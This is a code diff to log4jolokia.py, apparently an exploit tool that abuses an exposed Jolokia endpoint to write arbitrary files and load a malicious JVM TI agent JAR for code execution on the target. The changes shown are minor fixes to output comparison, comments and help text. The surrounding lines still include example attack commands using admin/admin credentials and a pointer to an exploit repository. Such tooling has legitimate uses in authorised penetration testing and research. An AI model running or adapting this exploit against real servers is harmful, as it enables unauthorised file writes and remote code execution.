@@ -70,7 +70,8 @@ elif mode == 'write_file':
 		E.g. Unix == /tmp
      		Windows == C:/Users/Public''',default='/tmp')
 	mode_parser.epilog = """Example command:
-	python3 log4jolokia.py write_file http://127.0.0.1:8161/console/jolokia/ -lf 00-ff.txt -w /tmp/test_write -u admin -p admin -H 'Origin: http://localhost'\n"""
+	python3 log4jolokia.py write_file http://127.0.0.1:8161/console/jolokia/ -lf 00-ff.txt -w /tmp/test_write -u admin -p admin -H 'Origin: http://localhost'
+	"""
 else:
 	### exec jar
 	mode_parser.add_argument('-j','--jar', nargs='?',help='Path to local jar to be executes on the target (Use only with mode: exec_jar)',required=True)
@@ -78,7 +79,8 @@ else:
 		E.g. Unix == /tmp
      		Windows == C:/Users/Public''',default='/tmp')
 	mode_parser.epilog = "Example command:\n\tpython3 log4jolokia.py exec_jar http://127.0.0.1:8161/console/jolokia/ -j mal_linux.jar -u admin -p admin -H 'Origin: http://localhost'"
-	mode_parser.epilog += "\n\nValid jvmtiAgent JARs can be obtained from https://github.com/mbadanoiu/jvmtiAgentLoad-Exploit\n"
+	mode_parser.epilog += """\n\nValid jvmtiAgent JARs can be obtained from https://github.com/mbadanoiu/jvmtiAgentLoad-Exploit
+	"""
 
 args = mode_parser.parse_args()
 ### argparse
@@ -362,7 +364,8 @@ def write_file(target, local_file, path, mbean, tmp_dir="/tmp", verbose=True):
 	setConfigLocationUri(target, path, mbean, verbose=False)
 	written = getConfigText(target, mbean, verbose=False)
 
-	if content == written:
+	# XML eliminates trailing white spaces, \n, \r, \t
+	if content.rstrip() == written:
 		print(f"[+] File \"{path}\" has been successfully written on the target")
 	else:
 		print("[!] The given content does not match the content retreived from the target")
@@ -374,7 +377,7 @@ def exec_jar(target, jar, mbean, tmp_dir='/tmp'):
 	- The JAR contains a valid JVM TI agent
 	- Once a JAR is successfully loaded:
 		-- No new JAR can be loaded until the Java applicaiton is restarted (a.k.a. pick your commands wisely because you only have one shot)
-		-- The JAR code will execute everytime time the jvmtiAgentLoad() function is called
+		-- The JAR code will execute everytime the jvmtiAgentLoad() function is successfully called (result == "return code: 0")
 
 If you agree with the above enter "yes" to continue: """)
 
